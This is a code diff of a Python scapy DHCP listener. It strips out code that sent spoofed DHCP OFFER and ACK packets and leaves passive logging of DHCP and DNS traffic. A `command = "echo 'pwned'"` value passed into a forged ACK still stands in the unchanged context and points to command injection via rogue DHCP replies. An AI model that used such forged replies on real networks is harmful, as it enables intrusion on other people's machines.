@@ -1,7 +1,3 @@
-"""scapy-dhcp-listener.py
-Listen for DHCP packets using scapy to learn when LAN 
-hosts request IP addresses from DHCP Servers.
-"""
 
 from __future__ import print_function
 from scapy.all import *
@@ -13,6 +9,7 @@ command = "echo 'pwned'"
 if os.geteuid() != 0:
     sys.exit("Run as root ~sudo su")
 
+f= open("log.txt","w+")
 
 # Fixup function to extract dhcp_options by key
 def get_option(dhcp_options, key):
@@ -70,7 +67,7 @@ def dhcp_ack(raw_mac, xid, command):
     return packet
 
 
-def handle_dhcp_packet(packet):
+def handle_req(packet):
 
     if packet.haslayer(DHCP):
         mac_addr = packet[Ether].src
@@ -78,99 +75,65 @@ def handle_dhcp_packet(packet):
 
         # Match DHCP discover
         if DHCP in packet and packet[DHCP].options[0][1] == 1:
-            print('---')
             print('New DHCP Discover')
-            # print(packet.summary())
-            # print(ls(packet))
-            # print "[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
-            hostname = get_option(packet[DHCP].options, 'hostname')
-            print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")
-            xid = packet[BOOTP].xid
-            print("[*] Sending OFFER...")
-            p = dhcp_offer(raw_mac, xid)
-            sendp(p, iface='wlp6s0')
+            print(packet.summary())
+            print('-- LS PACKET ----\n')
+            #  print(packet.show())
+            # f.write(ls(packet))
 
         # Match DHCP offer
         elif DHCP in packet and packet[DHCP].options[0][1] == 2:
             print('---')
-            print('New DHCP Offer')
-            # print(packet.summary())
-            # print(ls(packet))
-
-            subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
-            lease_time = get_option(packet[DHCP].options, 'lease_time')
-            router = get_option(packet[DHCP].options, 'router')
-            name_server = get_option(packet[DHCP].options, 'name_server')
-            domain = get_option(packet[DHCP].options, 'domain')
-
-            print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
-                  f"offered {packet[BOOTP].yiaddr}")
-
-            print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
-                  f"{lease_time}, router: {router}, name_server: {name_server}, "
-                  f"domain: {domain}")
-
+            print('New DHCP OFFER')
+            print(packet.summary())
+            print('-- LS PACKET ----\n')
+            #  print(packet.show())
+            # f.write(ls(packet))
+        
         # Match DHCP request
         elif DHCP in packet and packet[DHCP].options[0][1] == 3:
             print('---')
             print('New DHCP Request')
-            # print(packet.summary())
-            # print(ls(packet))
-
-            requested_addr = get_option(packet[DHCP].options, 'requested_addr')
-            hostname = get_option(packet[DHCP].options, 'hostname')
-            print(
-                f"Host {hostname} ({packet[Ether].src}) requested {requested_addr}")
-            xid = packet[BOOTP].xid
-            # print "[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid)
-            p = dhcp_ack(raw_mac, xid, command)
-            # print hexdump(packet)
-            # print packet.show()
-            print("[*] Sending ACK...")
-            sendp(p, iface='wlp6s0')
-
-            # send_ack()
+            print(packet.summary())
+            print('-- LS PACKET ----\n')
+            #  print(packet.show())
+            # f.write(ls(packet))
 
         # Match DHCP ack
         elif DHCP in packet and packet[DHCP].options[0][1] == 5:
             print('---')
             print('New DHCP Ack')
-            # print(packet.summary())
-            # print(ls(packet))
-
-            subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
-            lease_time = get_option(packet[DHCP].options, 'lease_time')
-            router = get_option(packet[DHCP].options, 'router')
-            name_server = get_option(packet[DHCP].options, 'name_server')
-
-            print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
-                  f"acked {packet[BOOTP].yiaddr}")
-
-            print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
-                  f"{lease_time}, router: {router}, name_server: {name_server}")
+            print(packet.summary())
+            print('-- LS PACKET ----\n')
+            #  print(packet.show())
+            # f.write(ls(packet))
 
         # Match DHCP inform
         elif DHCP in packet and packet[DHCP].options[0][1] == 8:
             print('---')
             print('New DHCP Inform')
-            # print(packet.summary())
-            # print(ls(packet))
-
-            hostname = get_option(packet[DHCP].options, 'hostname')
-            vendor_class_id = get_option(
-                packet[DHCP].options, 'vendor_class_id')
-
-            print(f"DHCP Inform from {packet[IP].src} ({packet[Ether].src}) "
-                  f"hostname: {hostname}, vendor_class_id: {vendor_class_id}")
+            print(packet.summary())
+            print('-- LS PACKET ----\n')
+            # f.write(ls(packet))
 
         else:
             print('---')
             print('Some Other DHCP Packet')
-            # print(packet.summary())
-            # print(ls(packet))
+            print(packet.summary())
+            print('-- LS PACKET ----\n')
+            #  print(packet.show())
+            # f.write(ls(packet))
+
+    elif packet.haslayer(DNS):
+      print('---')
+      print('DNS Call')
+      print(packet)
 
     return
 
 
 if __name__ == "__main__":
-    sniff(filter="udp and (port 67 or 68)",iface='wlp6s0', prn=handle_dhcp_packet)
+  try:
+    sniff(filter="udp and (port 67 or 68)",iface='wlp6s0', prn=handle_req)
+  except KeyboardInterrupt:
+    f.close()
